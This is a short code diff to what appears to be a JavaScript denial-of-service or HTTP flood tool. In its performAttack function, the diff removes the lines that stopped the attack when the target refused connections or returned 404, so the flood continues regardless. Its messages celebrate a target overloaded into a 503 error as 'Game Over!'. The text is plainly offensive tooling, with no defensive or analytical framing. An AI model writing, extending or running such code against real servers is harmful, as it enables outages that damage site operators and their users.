@@ -162,10 +162,8 @@ const performAttack = (url, agent, continueAttack, requestsSent, checkCompletion
             err.message === "Socket is closed"
         ) {
             console.log(rainbow("Unable to Attack Target Server Refused!"));
-            continueAttack = false;
         } else if (err.response?.status === 404) {
             console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
-            continueAttack = false;
         } else if (err.response?.status === 503) {
             console.log(rainbow("Target under heavy load (503) - Game Over!"));
         } else if (err.response?.status === 502) {
